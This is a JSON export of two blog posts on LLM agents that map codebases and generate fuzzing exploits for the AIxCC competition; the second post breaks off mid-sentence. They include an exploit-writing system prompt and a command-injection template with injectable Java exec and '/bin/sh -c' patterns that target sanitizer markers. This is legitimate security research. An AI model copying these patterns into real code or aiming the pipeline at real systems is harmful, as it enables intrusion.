[{"section":"Blog","slug":"/blog/post-mlla-disc-agents/","title":"From Harness to Vulnerability: AI Agents for Code Comprehension and Bug Discovery","description":"","date":"September 4, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/cpua_preview_hu_c6b9dae04664146.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/cpua_preview_hu_f330b0021751354e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/cpua_preview_hu_21b7801606f6eaca.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/cpua_preview_hu_239404ac091d6f73.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, multi-agent","content":"Beneath the Exploit: The Groundwork That Makes Bug Hunting Possible When people hear about AI agents finding vulnerabilities, they often imagine the spectacular finale: an exploit payload triggering a crash, or a carefully crafted generator slipping past validation layers.\nBut here‚Äôs the truth: none of that would have been possible without groundwork laid by three quieter agents.\nBefore any exploit can be created, the system must answer harder, subtler questions:\nWhich functions in this ocean of code are worth exploring? How do they connect to one another? Where are the potential dangerous sinks? That‚Äôs the job of CPUA, CGPA, and MCGA ‚Äî the scouts, librarians, and cartographers of the MLLA ecosystem. They don‚Äôt generate flashy exploits. Instead, they build the maps, catalogs, and entry points that make exploit generation possible.\nIn fact, if MCGA doesn‚Äôt detect a vulnerable sink, BCDA and BGA never even get triggered. This pipeline dependency means the exploit stage only happens because these three agents did their job first.\nWhy Code Comprehension Matters Imagine being dropped into a foreign city with millions of streets but no map. That‚Äôs what a raw codebase looks like to a fuzzer. You could wander aimlessly (traditional fuzzing), but you‚Äôll likely never find the treasure. Instead, you need guides who can:\nScout entry points (harness functions that process input) Retrieve precise directions (resolve function definitions, signatures, and dependencies) Draw accurate maps (call graphs with danger zones clearly marked) That‚Äôs what CPUA, CGPA, and MCGA do. They are not about brute force; they are about intelligence in navigation.\nüéØ CPUA: The Scout If every heist needs someone to case the building first, CPUA (CP Understanding Agent) is that scout.\nInput: Harness file contents (the starting point of fuzzing). Output: A prioritized list of ‚Äúinteresting functions‚Äù that deserve attention. CPUA uses LLM reasoning to analyze harnesses, detect functions that handle untrusted input, and annotate them with metadata like:\nFunction names and locations Priority scores (e.g., fuzzed input vs. utility function) Tainted parameters This focus prevents wasted effort. Instead of traversing millions of functions, CPUA narrows the field to dozens that actually matter.\nStrengths:\nLanguage-independent (works for C, C++, Java, etc.) Can handle reflection-heavy harnesses (common in JVM projects) Limitations:\nIf the harness doesn‚Äôt expose critical functions (like in nginx), CPUA can‚Äôt surface them. Still, CPUA‚Äôs scouting ability sets the stage. Without it, later agents would drown in noise.\nHands-on Example:\n# Simplified CPUA flow (from cpua.py) def analyze_harness(harness_code: str) -\u0026gt; list[str]: funcs = extract_function_calls(harness_code) prioritized = rank_functions(funcs) # fuzzed input, tainted args return prioritized # Example harness snippet harness = \u0026#34;\u0026#34;\u0026#34; public void fuzzerTestOneInput(FuzzedDataProvider data) { String xml = data.consumeString(100); parseDocument(xml); // interesting helperLog(xml); // low priority } \u0026#34;\u0026#34;\u0026#34; print(analyze_harness(harness)) # Output: [\u0026#34;parseDocument\u0026#34;, \u0026#34;helperLog\u0026#34;] üìö CGPA: The Librarian Once CPUA points at ‚Äúinteresting‚Äù functions, the next question is: where exactly are they, and what do they look like?\nThat‚Äôs the role of CGPA (Call Graph Parser Agent) ‚Äî the meticulous librarian of the team.\nInput: Partial function info (e.g., just a function name, or callsite reference). Output: Full function definition (location, signature, body, caller/callee context). CGPA achieves this by orchestrating a suite of tools:\nJoern for deep static analysis and Code Property Graphs LSP (via multilspy, patched to support clangd for C/C++/Java) Ripgrep/AST-grep for syntax-aware code searching Code Indexer for fast cross-referencing If multiple candidates match, CGPA can even query the LLM to disambiguate.\nThink of it this way: if CPUA says ‚Äúgo check the room marked ‚ÄòprocessInput‚Äô,‚Äù CGPA is the one who fetches the blueprints and directions to the exact door, floor, and lock.\nHands-on Example:\n# Simplified CGPA query (from cgpa.py) def resolve_function(partial: str) -\u0026gt; dict: result = code_indexer.lookup(partial) if not result: result = lsp.find_definition(partial) if not result: result = joern.query(f\u0026#39;function.name=\u0026#34;{partial}\u0026#34;\u0026#39;) return result # Example: partial info = \u0026#34;parseDocument\u0026#34; print(resolve_function(\u0026#34;parseDocument\u0026#34;)) # Output: # { # \u0026#34;file\u0026#34;: \u0026#34;src/main/java/org/example/XMLParser.java\u0026#34;, # \u0026#34;signature\u0026#34;: \u0026#34;public void parseDocument(String xml)\u0026#34;, # \u0026#34;start_line\u0026#34;: 42, # \u0026#34;end_line\u0026#34;: 87 # } üó∫Ô∏è MCGA: The Cartographer Now comes the most ambitious of the trio: MCGA (Make Call Graph Agent). If CPUA is the scout and CGPA the librarian, MCGA is the cartographer ‚Äî building maps of how code actually flows.\nInput: Function info (name, file, code, tainted args). Output: Structured call graph annotated with vulnerability info. MCGA works recursively:\nRoot Node Initialization ‚Äì Starts from a target function (resolved via CGPA). Callee Extraction ‚Äì Finds all callsites in the body. Vulnerable Sink Detection ‚Äì Uses LLM reasoning to flag dangerous operations (e.g., system calls, unsafe deserialization). Callee Resolution ‚Äì Queries CGPA to fetch precise info for each callee. Recursive Expansion ‚Äì Builds subgraphs, detects cycles, and respects depth limits. Caching \u0026amp; Efficiency ‚Äì Uses Redis + in-memory caches to prevent re-analysis. Structured Output ‚Äì Returns a FuncInfo tree, each node annotated with sink detection reports. Hands-on Example:\n# From mcga.py def build_call_graph(fn: FuncInfo) -\u0026gt; FuncInfo: callees = extract_callees(fn.func_body) for callee in callees: callee_info = cgpa.resolve_function(callee) child = FuncInfo(func_location=callee_info) fn.children.append(child) if detect_sink(child): # e.g., Runtime.exec, SQL query child.sink_detector_report = {\u0026#34;sink\u0026#34;: True} build_call_graph(child) # recursion return fn # Example call graph output root = FuncInfo(func_location={\u0026#34;name\u0026#34;: \u0026#34;parseDocument\u0026#34;}) graph = build_call_graph(root) print(graph.to_json()) # { # \u0026#34;name\u0026#34;: \u0026#34;parseDocument\u0026#34;, # \u0026#34;children\u0026#34;: [ # {\u0026#34;name\u0026#34;: \u0026#34;validateXML\u0026#34;, \u0026#34;children\u0026#34;: []}, # {\u0026#34;name\u0026#34;: \u0026#34;loadExternalDTD\u0026#34;, \u0026#34;sink\u0026#34;: true} # ] # } Here, loadExternalDTD is flagged as a sink ‚Äî a finding that triggers BCDA to generate a BugInducingThing and eventually hands off to BGA for exploit generation.\nEngineering Challenges Building these agents was far from trivial. Some lessons from the trenches:\nLLM Cost Control: Call graph expansion is recursive and potentially explosive. We had to integrate caching layers and prioritize tool-based results (Joern, LSP) before falling back to LLM calls. Balancing Static and Dynamic: Pure LLM reasoning often hallucinated callees. By mixing AST parsing, coverage traces, and Joern outputs, MCGA became both faster and more accurate. Asynchronous Execution: Instead of serially building massive graphs, MCGA launches sink detections asynchronously, enabling early-stage bug discovery. Lessons Learned Reflecting on this design, a few insights stand out:\nMachine-Guided Beats Human-Mimicry Early on, we tried to mimic human auditors too literally. Later, we leaned into machine advantages ‚Äî like async graph expansion and LLM-guided fuzzing integration ‚Äî and saw better results. Context Engineering Is the Next Frontier LLMs thrive on top-down descriptions with selective detail. Feeding call paths, tainted args, and sanitizer hints in structured form was more effective than dumping entire files. Integration Matters These agents weren‚Äôt just standalone tools; they were designed to hand off work seamlessly. CPUA‚Äôs outputs flowed into MCGA, which in turn leaned on CGPA, all culminating in BCDA and BGA. Closing Thoughts When I actually worked on using LLMs to find bugs, I came away with some mixed but exciting impressions.\nFirst, I realized that fuzzing and LLMs shine in very different domains. Fuzzers are still unmatched at surfacing memory corruption issues, such as crashes, overflows, dangling pointers, the kinds of low-level chaos that brute-force mutation is naturally good at exploring. But when it comes to logic errors, fuzzers are only as good as their bug oracles. LLMs, on the other hand, surprised me with how well they could identify logic errors. They‚Äôre able to reason about semantics, invariants, and unintended behavior in a way fuzzers can‚Äôt. That made me think: maybe LLMs could be especially valuable in areas like smart contracts, where correctness depends far more on logic than memory safety.\nThat said, LLMs struggle with memory corruption directly. Many of these bugs are deeply context-dependent ‚Äî think use-after-free, or API-sequence‚Äìdriven vulnerabilities. To capture that context, you‚Äôd have to feed the model an enormous slice of the codebase, which quickly runs into context window limits. That‚Äôs why we designed UniAFL to use LLMs more as assistants to fuzzing rather than replacements. The fuzzer provides raw coverage and brute force, while the LLM helps steer: generating better seeds, prioritizing paths, or highlighting suspicious functions. It worked well in practice, but it also showed me how much room there is to grow. Handling execution context, the stateful conditions that make subtle memory bugs appear, is still a frontier. I even considered attaching tools like a debugger to give LLMs richer execution insights, but we simply didn‚Äôt have the time during the competition. Still, I think giving LLMs better tools to reason about those contexts will be one of the most promising directions forward.\nLooking back at the competition, I think the results were encouraging. Every system was constrained to a handful of harnesses, each exercising only a limited set of functions. Within that tight scope, Atlantis still uncovered six zero-day vulnerabilities. That felt significant. It also hinted at potential: with more harnesses, or with broader harness coverage per project, the number of bugs we could find would scale up dramatically.\nThat leaves me asking a deeper question: what makes a good harness? A harness isn‚Äôt just a piece of glue code. It defines the context needed to trigger a bug. And building the right context is exactly where I think LLMs can shine. They‚Äôre good at understanding code, generating scaffolding, and filling in the missing pieces of a test. If we can teach them to generate better harnesses, we might open up whole new classes of vulnerabilities that current tools can‚Äôt touch.\nIn the end, my biggest takeaway is that LLMs are not here to replace human security researchers or fuzzers. Instead, they‚Äôre here to amplify our reach. Fuzzers will continue to hammer the low-level space. Humans will continue to frame the hardest questions. And LLMs can be the bridge, helping us understand complex codebases, reason about hidden contexts, and design smarter experiments.\nFrom harness to vulnerability, the journey is long. But with LLMs as collaborators rather than replacements, I believe we can explore parts of the security landscape that used to feel unreachable.\nüìö Technical Resources Source Code by Agent: CPUA CGPA MCGA üîó Related Deep Dives MLLA Overview: The Complete System UniAFL: The Fuzzing Infrastructure BGA: Self-Evolving Exploits Through Multi-Agent AI Context Engineering: How BGA Teaches LLMs to Write Exploits Coming Soon: BCDA - The AI Detective Separating Real Bugs from False Alarms "},{"section":"Blog","slug":"/blog/post-context-engineering/","title":"Context Engineering: How BGA Teaches LLMs to Write Exploits","description":"Deep dive into the context engineering techniques that make BGA&#39;s AI agents effective at vulnerability exploitation - from XML structuring to coverage feedback loops","date":"September 2, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/context_engineering_hu_b4952bbf85a062d8.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/context_engineering_hu_70837bf40a640917.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/context_engineering_hu_cecf141133924075.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/context_engineering_hu_24fa4235e54972d1.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, exploit-generation, context-engineering, prompt-engineering, coverage-feedback, bga","content":"The Problem with Teaching AI to Hack Teaching an LLM to write working exploits is more challenging than typical AI tasks. Unlike most applications where \u0026ldquo;close enough\u0026rdquo; works, vulnerability exploitation requires precise execution. A single character error can make an entire exploit fail.\nTake this seemingly simple Java reflective call injection vulnerability:\nString className = request.getParameter(\u0026#34;class\u0026#34;); Class.forName(className); // BUG: arbitrary class loading This looks straightforward, but there\u0026rsquo;s a catch: to exploit this vulnerability, the LLM must load the exact class name \u0026quot;jaz.Zer\u0026quot; to trigger Jazzer\u0026rsquo;s detection. Not \u0026quot;jaz.Zero\u0026quot;, not \u0026quot;java.Zer\u0026quot;, not \u0026quot;jaz.zer\u0026quot;. One character wrong and the entire exploit fails.\nThis precision challenge led us to develop context engineering ‚Äì a systematic approach to structuring information that transforms LLMs from educated guessers into reliable exploit generators. These techniques became the backbone of our BGA framework and delivered impressive results during the AIxCC competition.\nHere\u0026rsquo;s what we learned: LLMs don\u0026rsquo;t need smarter algorithms ‚Äì they need smarter information delivery. This post shows you exactly how we solved this challenge, with real examples from our research.\nFour Foundational Principles After studying prompt engineering research (OpenAI, Anthropic), we had a realization: talking to LLMs effectively is a lot like explaining complex topics to humans. What makes sense to a human usually makes sense to an LLM too.\nThink about it ‚Äì when you\u0026rsquo;re overwhelmed with information, you lose focus. LLMs do the same thing. That\u0026rsquo;s why we design focused prompts that clearly establish what needs to be done.\nThis human-centered approach led us to four core principles that guide everything we do:\n1. Top-Down Guidance Give the big picture first, then zoom in. Just like explaining a complex topic to a colleague, you start with the overall goal before diving into specifics. We always begin with role definition, then expertise areas, then objectives, and finally the detailed steps.\n2. Structure \u0026amp; Clarity Organize information logically and eliminate ambiguity. We use hierarchical XML structures, clear section boundaries, and explicit relationships between concepts. In vulnerability exploitation, vague instructions lead to failed exploits.\n3. Concise Yet Comprehensive Include everything needed, but cut the fluff. Every piece of information should serve a purpose. We provide complete vulnerability context while filtering out irrelevant details that might confuse the LLM.\n4. Avoid Overcomplication Simple and clear beats clever and complex. If we can\u0026rsquo;t easily explain how something works, it\u0026rsquo;s probably too complicated for consistent LLM performance. We stick to patterns that work reliably.\nThese principles treat LLMs as intelligent partners that need well-structured information, not magic boxes that somehow \u0026ldquo;just know\u0026rdquo; what to do. As you\u0026rsquo;ll see in our results, this approach made a huge difference.\nFour Core Techniques Building our LLM-based security tools taught us something important: basic prompting doesn\u0026rsquo;t cut it for complex vulnerability exploitation. LLMs need a systematic way to understand vulnerabilities, parse complicated code relationships, and generate precise exploits.\nOur context engineering approach solves this through four key techniques that delivered solid improvements across different vulnerability types:\nXML-Structured Context Design ‚Äì Hierarchical organization for reliable LLM parsing Source Code Annotation Systems ‚Äì Precision markers that focus attention on critical code Coverage-Driven Iterative Refinement ‚Äì Execution feedback loops that eliminate guesswork Domain Knowledge Integration ‚Äì Selective injection of vulnerability-specific expertise How They Work Together These techniques work as a team, with each one strengthening the others:\nXML structures provide the foundation - a reliable way to organize complex vulnerability information that LLMs can consistently parse, following our \u0026ldquo;big picture first\u0026rdquo; approach\nAnnotation systems add precision through markers like @VISITED, @BUG_HERE, and @KEY_CONDITION, helping LLMs focus on what actually matters in massive codebases\nCoverage feedback turns guesswork into systematic problem-solving by showing the LLM exactly what conditions it has reached and what still needs to be satisfied\nDomain knowledge fills in the gaps - providing vulnerability patterns, data structure handling, and exploitation techniques that generic LLMs don\u0026rsquo;t naturally know\nPut it all together, and you get LLMs that can reliably generate working exploits instead of just making educated guesses. Let\u0026rsquo;s dive into how each technique works.\nTechnique 1: XML-Structured Context Design Implements: Structure \u0026amp; Clarity\nWhy XML Works for Technical Context Our approach uses XML organization to implement our Structure \u0026amp; Clarity principle. We emphasize hierarchical structure, context-before-complexity, annotation clarity, and clear organization. This approach aligns with Anthropic\u0026rsquo;s recommendations for using XML with Claude, which highlights XML\u0026rsquo;s advantages: Clarity, Accuracy, Flexibility, and Parseability.\nXML excels at representing data hierarchy and relationships. The verbose tags provide unambiguous boundaries and semantic sections that help LLMs understand not just the data, but its purpose and nested structure:\n\u0026lt;SOURCE_CODE_INFO\u0026gt; \u0026lt;FUNCTION_CALL_FLOW\u0026gt; - fuzzerTestOneInput - GzipCompressorInputStream.\u0026lt;init\u0026gt; // @BUG is in the below function. - init \u0026lt;/FUNCTION_CALL_FLOW\u0026gt; \u0026lt;VULNERABLE_FUNCTION\u0026gt; \u0026lt;FUNC_BODY\u0026gt; [398]: if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { /* @KEY_CONDITION */ [399]: new ProcessBuilder(fname).start(); /* @BUG_HERE */ \u0026lt;/FUNC_BODY\u0026gt; \u0026lt;/VULNERABLE_FUNCTION\u0026gt; \u0026lt;/SOURCE_CODE_INFO\u0026gt; This hierarchical XML structure shows how we organize complex vulnerability context - from high-level call flows down to specific vulnerable lines, with clear semantic sections that enable both automated parsing and human readability.\nImplementing Top-Down Guidance Our prompt structure follows Top-Down Guidance through a systematic flow: System prompt ‚Üí Source code ‚Üí Sub-task ‚Üí Coverage feedback ‚Üí Analysis. Each agent receives context in this order, starting with their role and objectives before diving into technical details.\nReal System Prompt Structure Here\u0026rsquo;s our actual BlobGen system prompt structure, demonstrating these principles in practice:\n\u0026lt;role\u0026gt; You are an expert security researcher specializing in vulnerability analysis and exploit development for an oss-fuzz project. Your mission is to analyze code for security vulnerabilities and demonstrate them through carefully crafted payloads that trigger sanitizers. \u0026lt;/role\u0026gt; \u0026lt;expertise\u0026gt; You possess specialized knowledge in: - Vulnerability analysis in large codebases - Endianness handling - Sanitizer-based vulnerability detection ... \u0026lt;/expertise\u0026gt; \u0026lt;final_objective\u0026gt; Your ultimate goal is to implement a Python \u0026#39;create_payload() -\u0026gt; bytes\u0026#39; function that: - Returns ONLY a single bytes object (no tuples/dicts) - Handles loop iterations and state when needed - Uses ONLY built-in Python libraries (e.g., struct, json, base64) unless specified - Documents each condition in the implementation ... IMPORTANT: Avoid any redundant code, variables, or operations \u0026lt;/final_objective\u0026gt; \u0026lt;context\u0026gt; - Target project name is: aixcc/jvm/r3-apache-commons-compress - Target harness name is: CompressorGzipFuzzer - Target sanitizer and vulnerability: \u0026#39;JazzerSanitizer.OSCommandInjection\u0026#39; ... \u0026lt;/context\u0026gt; \u0026lt;code_annotations\u0026gt; The following annotations mark specific lines in the code: - /* @BUG_HERE */ comments: The line immediately after contains the vulnerability - /* @KEY_CONDITION */ comments: The line immediately after contains an important condition \u0026lt;/code_annotations\u0026gt; Notice the systematic organization:\n\u0026lt;role\u0026gt; establishes identity and mission \u0026lt;expertise\u0026gt; provides domain context \u0026lt;final_objective\u0026gt; specifies exact technical requirements \u0026lt;context\u0026gt; grounds the task in specific targets \u0026lt;code_annotations\u0026gt; explains our marking system This hierarchical structure, combined with context-before-complexity ordering and annotation clarity, maximizes LLM effectiveness for technical exploitation challenges.\nTechnique 2: Source Code Annotation Systems Implements: Concise Yet Comprehensive\nThe [n]: Line Number Format We developed a specific format for delivering source code that consistently works across different LLMs. Inspired by RustAssistant by Microsoft, we use [n]: formatting where brackets and colons distinguish line numbers from code literals:\n\u0026lt;SOURCE_CODE_INFO\u0026gt; \u0026lt;FUNCTION_CALL_FLOW\u0026gt; - fuzzerTestOneInput - GzipCompressorInputStream.\u0026lt;init\u0026gt; ... // @BUG is in the below function. - init \u0026lt;/FUNCTION_CALL_FLOW\u0026gt; \u0026lt;ENTRY_FUNCTION\u0026gt; \u0026lt;FUNC_BODY\u0026gt; [23]: public static void fuzzerTestOneInput(byte[] data) { [24]: try { /* @KEY_CONDITION */ [25]: fuzzCompressorInputStream(new GzipCompressorInputStream(new ByteArrayInputStream(data), true)); ... \u0026lt;/FUNC_BODY\u0026gt; \u0026lt;/ENTRY_FUNCTION\u0026gt; \u0026lt;VULNERABLE_FUNCTION\u0026gt; \u0026lt;FUNC_BODY\u0026gt; [343]: private boolean init(final boolean isFirstMember) throws IOException { [344]: if (!isFirstMember \u0026amp;\u0026amp; !decompressConcatenated) { /* @KEY_CONDITION */ ... [398]: if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { /* @KEY_CONDITION */ [399]: new ProcessBuilder(fname).start(); /* @BUG_HERE */ [400]: } ... \u0026lt;/FUNC_BODY\u0026gt; \u0026lt;/VULNERABLE_FUNCTION\u0026gt; \u0026lt;/SOURCE_CODE_INFO\u0026gt; The @ Annotation System Our annotation system implements Concise Yet Comprehensive by using precise markers like @VISITED, @KEY_CONDITION, and @BUG_HERE to highlight only the most critical information. Instead of overwhelming the LLM with entire codebases, we mark exactly what matters:\n@BUG_HERE: The line immediately after contains the actual vulnerability @KEY_CONDITION: The line immediately after contains a condition that must be satisfied to reach the vulnerability @VISITED: Added dynamically during execution to show which conditions were reached This annotation system derives from BCDA\u0026rsquo;s Bug Inducing Things (BITs) and provides clear, unambiguous markers that focus LLM attention on critical decision points while filtering out irrelevant code paths.\nTechnique 3: Coverage-Driven Iterative Refinement The @VISITED Breakthrough Here\u0026rsquo;s where things get really interesting. The breakthrough that transformed our success rate was incorporating execution coverage directly into context through @VISITED markers. Think of it as giving the AI real-time feedback on what\u0026rsquo;s actually happening when it runs its code.\nWhen a payload executes, we collect coverage data - which functions ran, which files were touched, which lines were hit. Then we compare this against our BIT-identified key conditions and add @VISITED markers to show exactly which conditions were reached. It\u0026rsquo;s like having a conversation: \u0026ldquo;You tried this, here\u0026rsquo;s what actually happened, now what should you try next?\u0026rdquo;\nWe also provide brief hints about the source code structure upfront, giving agents initial understanding before they receive detailed coverage feedback. But here\u0026rsquo;s the key insight - coverage engines aren\u0026rsquo;t perfect. We explicitly guide the LLM that this information might have gaps and should be used as reference only. Notice how we frame our coverage feedback:\n\u0026lt;COVERAGE_INFO_FOR_KEY_CONDITIONS\u0026gt; \u0026lt;HOW_TO_USE\u0026gt; Coverage information from payload execution. Use as reference only - may contain inaccuracies. Focus on key conditions and bug locations to guide payload refinement. \u0026lt;/HOW_TO_USE\u0026gt; \u0026lt;XXD_OUTPUT_FOR_PAYLOAD_BLOB\u0026gt; 00000000: 1f8b 0808 6565 6e41 0002 6a61 7a7a 6500 ....eenA..jazze. ... \u0026lt;/XXD_OUTPUT_FOR_PAYLOAD_BLOB\u0026gt; \u0026lt;SOURCE_CODE_INFO\u0026gt; ... [344]: if (!isFirstMember \u0026amp;\u0026amp; !decompressConcatenated) { /* @KEY_CONDITION | @VISITED */ [351]: if (magic0 == -1 \u0026amp;\u0026amp; !isFirstMember) { /* @KEY_CONDITION | @VISITED */ [354]: if (magic0 != GzipUtils.ID1 || in.read() != GzipUtils.ID2) { /* @KEY_CONDITION | @VISITED */ [394]: if ((flg \u0026amp; GzipUtils.FNAME) != 0) { /* @KEY_CONDITION | @VISITED */ ... [398]: if (modTime == 1731695077L \u0026amp;\u0026amp; fname != null) { /* @KEY_CONDITION */ [399]: new ProcessBuilder(fname).start(); /* @BUG_HERE */ ... \u0026lt;/SOURCE_CODE_INFO\u0026gt; \u0026lt;/COVERAGE_INFO_FOR_KEY_CONDITIONS\u0026gt; \u0026lt;STDERR_FOR_PAYLOAD_BLOB\u0026gt; java.io.IOException: Gzip-compressed data is corrupt at org.apache.commons.compress.compressors.gzip.GzipCompressorInputStream.read ... ... at CompressorGzipFuzzer.fuzzerTestOneInput(CompressorGzipFuzzer.java:25) \u0026lt;/STDERR_FOR_PAYLOAD_BLOB\u0026gt; The @VISITED markers provide immediate visual feedback: you can see the payload successfully reached line 394 but failed at line 398. The hexadecimal dump and error message provide additional debugging context.\nSystematic Iterative Refinement This coverage feedback transforms what could be random guessing into systematic problem-solving. The LLM analyzes coverage results to identify the gap between where it got and where it needs to be. Instead of showing the entire codebase, we present only the vulnerability-relevant annotated lines with @VISITED markers. This filters out the noise and focuses attention on the critical decision points.\nHere\u0026rsquo;s the workflow: analyze coverage gaps ‚Üí identify what conditions weren\u0026rsquo;t met ‚Üí make targeted modifications ‚Üí try again. The agent repeats this up to four times, each iteration getting smarter about what needs to change. It\u0026rsquo;s like having a persistent debugging session where each attempt builds on the insights from the previous one.\nThis approach transforms unreliable single-shot LLM generation into systematic vulnerability exploitation through feedback loops and adaptive refinement. Instead of hoping the AI gets lucky on the first try, we give it a structured way to learn from its mistakes.\nMulti-Variation Coverage Analysis But we don\u0026rsquo;t stop at single attempts. The Generator Agent operates through a systematic 6-step process: select sanitizer, plan the approach, create multiple payload variations, collect coverage from all attempts, update context based on promising patterns, then analyze and refine.\nHere\u0026rsquo;s the clever part: instead of just looking at one payload attempt, we generate about 20 variations and merge their coverage data. This gives us a broader view of what\u0026rsquo;s possible and what\u0026rsquo;s working across multiple attempts. It\u0026rsquo;s like having 20 different explorers mapping out a cave system - collectively, they discover much more than any single explorer could alone.\n\u0026lt;COVERAGE_SUMMARY\u0026gt; Primary Coverage (Functions in target call path): - Functions: 15, Files: 4, Lines: 98 Entire Coverage (Including out of call paths): - Total Functions: 22, Total Files: 5, Total Lines: 120 Changes in Entire Coverage: - Newly covered: 22 functions in 5 files (+120 lines) - No longer covered: 0 functions in 0 files (-0 lines) \u0026lt;/COVERAGE_SUMMARY\u0026gt; \u0026lt;COVERAGE_DIFF\u0026gt; \u0026lt;new_coverage\u0026gt; \u0026lt;functions_with_line_counts\u0026gt; - getFileNameCharset: 1 more lines - setComment: 2 more lines - setFileName: 2 more lines ... \u0026lt;/functions_with_line_counts\u0026gt; \u0026lt;/new_coverage\u0026gt; \u0026lt;/COVERAGE_DIFF\u0026gt; \u0026lt;task\u0026gt; Phase 1 Analysis: - Assess whether the generator successfully reaches the destination function ... Phase 2 Analysis: - Determine how close the generator came to triggering the vulnerability ... Finally, provide detailed feedback for improvement. \u0026lt;/task\u0026gt; This aggregated view helps the LLM understand which strategies are making progress across multiple attempts. Instead of seeing LLM non-determinism as a bug, we turn it into a feature - the natural variation in AI outputs becomes a systematic exploration strategy.\nTechnique 4: Domain Knowledge Integration Implements: Concise Yet Comprehensive\nSelective Knowledge Injection Here\u0026rsquo;s the reality: general-purpose LLMs don\u0026rsquo;t know much about security vulnerabilities. They might know SQL injection exists, but they don\u0026rsquo;t know the specific patterns that trigger each type or how to craft payloads that actually work.\nRather than overwhelming the AI with exhaustive security textbooks, we selectively inject only the relevant domain expertise for each vulnerability type. Think of it as just-in-time learning - we provide exactly what\u0026rsquo;s needed for the specific vulnerability at hand, no more, no less.\nThis domain knowledge integration also helped other agents in MLLA (MCGA, BCDA) detect vulnerability candidates by providing structured understanding of security patterns. However, the exploit guides are specifically used only in BGA for exploitation - other agents focus on bug discovery and don\u0026rsquo;t need the exploitation-specific guidance.\nVulnerability-Specific Context Templates We systematically prepared templates (complete implementation) covering 20 total vulnerability types:\n12 Jazzer types: SQLInjection, OSCommandInjection, XPathInjection, ServerSideRequestForgery, RegexInjection, JNDIInjection, ReflectiveCallInjection, ScriptEngineInjection, LDAPInjection, DeserializeObjectInjection, FilePathTraversal, TimeoutDenialOfService 8 AddressSanitizer types: BufferOverflow/Underflow, UseAfterFree/Return, DoubleFree, UseBeforeInitialization, FloatingPointException, TimeoutDenialOfService Each template combines three crucial elements: what the vulnerability looks like in code, how it typically manifests, and most importantly, exactly how to trigger it. You can see our complete templates in JazzerSanitizer_with_exploit.yaml and AddressSanitizer_with_exploit.yaml.\nWe intentionally focused on these 20 types and skipped MemorySanitizer and UndefinedBehaviorSanitizer - they would add compilation complexity for the UniAFL side and mostly catch easier bugs like signed integer overflow.\nOS Command Injection Template:\n\u0026lt;sanitizer\u0026gt; \u0026lt;type\u0026gt;OSCommandInjection\u0026lt;/type\u0026gt; \u0026lt;description\u0026gt; OS commands executed with user-controlled input. Find: Runtime.exec() or ProcessBuilder using user input, including command arrays. ```java String filename = request.getParameter(\u0026#34;file\u0026#34;); Runtime.getRuntime().exec(\u0026#34;cat \u0026#34; + filename); // BUG: command injection // Command array String[] cmd = {\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ls \u0026#34; + filename}; // BUG: shell injection new ProcessBuilder(cmd).start(); // Direct command String command = request.getParameter(\u0026#34;cmd\u0026#34;); Runtime.getRuntime().exec(command); // BUG: direct command execution ``` \u0026lt;/description\u0026gt; \u0026lt;exploit\u0026gt; 1. Locate command execution with user input 2. Execute exact target command \u0026#34;jazze\u0026#34; ```java Runtime.getRuntime().exec(\u0026#34;jazze\u0026#34;); // Exact command name required // OR with ProcessBuilder new ProcessBuilder(\u0026#34;jazze\u0026#34;).start(); // Alternative method ``` \u0026lt;/exploit\u0026gt; \u0026lt;/sanitizer\u0026gt; This template provides complete exploitation context: what the vulnerability looks like, how to recognize it in code, and most importantly, exactly how to trigger it.\nData Structure Handling Guides But domain knowledge isn\u0026rsquo;t just about vulnerability types - 